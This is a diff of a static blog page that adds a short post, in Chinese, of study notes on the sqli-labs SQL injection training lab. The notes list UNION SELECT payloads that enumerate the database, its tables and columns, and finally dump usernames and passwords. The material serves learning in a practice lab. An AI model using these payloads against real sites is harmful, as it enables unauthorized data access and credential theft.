@@ -64,6 +64,51 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/19/page-4/" class="article-date">
+  <time datetime="2020-11-19T15:23:35.000Z" itemprop="datePublished">2020-11-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/19/page-4/">sqli-labs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前两关</p>
+<p>输入？id=1和？id=2 和？id=2-1</p>
+<p>若2-1的结果和2一样则为字符型 若2-1 和1的结果一样则为数字型</p>
+<p>然后<em>确认字段位数</em> order by 数字一个个试看哪个报错就可确认其为n-1位</p>
+<p><em>确认占位信息</em>    ？id=-1 union select 1，<em>2，3 –+</em></p>
+<p><em>找库名</em>    ？id=-1 union select 1，2，database（）2之后的便是库名</p>
+<p><em>找表名</em>   ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ </p>
+<p><em>找字段名</em>   ?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema=’security’ and table_name=’users’–+</p>
+<p><em>找账号密码</em>  ?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) SEPARATOR ‘|’) from users –+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/19/page-4/" data-id="ckhoziyeg0000fcv756n202kc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-3" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/19/page-3/" class="article-date">
@@ -699,6 +744,10 @@ echo "Have a good night!";
       <ul>
         
           <li>
+            <a href="/2020/11/19/page-4/">sqli-labs</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/19/page-3/">less 3</a>
           </li>
         
@@ -712,10 +761,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2020/11/05/php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">php环境搭建</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/04/page-1/">page</a>
           </li>
         
       </ul>
